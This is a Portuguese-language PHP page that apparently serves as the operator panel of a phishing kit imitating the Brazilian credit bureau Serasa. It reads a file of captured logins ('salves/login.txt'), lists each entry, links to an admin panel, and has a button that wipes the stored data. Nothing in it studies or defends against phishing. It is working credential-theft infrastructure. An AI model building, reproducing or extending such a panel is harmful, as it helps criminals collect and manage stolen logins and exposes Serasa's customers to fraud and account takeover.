<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>logins Serasa</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f4f4f4;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      max-width: 800px;
      padding: 20px;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
    }
    .info {
      background-color: #f9f9f9;
      padding: 20px;
      margin-bottom: 20px;
      border-radius: 5px;
      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    }
    .info-title {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .info-content {
      font-size: 16px;
    }
    .btn-voltar,
    .btn-zerar {
      display: inline-block;
      margin: 20px 10px;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      text-decoration: none;
      text-align: center;
      font-size: 16px;
    }
    .btn-voltar {
      background-color: #007bff;
      color: #fff;
    }
    .btn-voltar:hover {
      background-color: #0056b3;
    }
    .btn-zerar {
      background-color: #ff0000;
      color: #fff;
    }
    .btn-zerar:hover {
      background-color: #cc0000;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 style="text-align: center;">Seus Logins Serasa</h1>
    <?php
    // Caminho do arquivo
    $infos_file = '../salves/login.txt';

    // Verifica se o arquivo existe
    if (file_exists($infos_file)) {
      // Lê o conteúdo do arquivo e explode em array pelas quebras de linha
      $infos = file_get_contents($infos_file);
      $infos_array = explode("===========\n", $infos);

      // Exibe cada informação separadamente
      foreach ($infos_array as $info) {
        // Remove espaços em branco extras e quebras de linha
        $info = trim($info);
        if (!empty($info)) {
          echo '<div class="info">';
          // Separa as linhas de cada informação
          $lines = explode("\n", $info);
          foreach ($lines as $line) {
            echo '<div class="info-content">' . htmlspecialchars($line) . '</div>';
          }
          echo '</div>';
        }
      }
    } else {
      echo '<p style="text-align: center; color: red;">Arquivo de informações não encontrado.</p>';
    }
    ?>
    <a href="../admin/painel.php" class="btn-voltar">Voltar</a>
    <form method="post">
      <button type="submit" class="btn-zerar" name="zerar">Zerar</button>
    </form>
    <?php
    if(isset($_POST['zerar'])) {
      // Abre o arquivo em modo de escrita e limpa seu conteúdo
      $file = fopen($infos_file, 'w');
      fclose($file);
      echo '<p style="text-align: center; color: green;">As informações foram zeradas.</p>';
    }
    ?>
  </div>
</body>
</html>
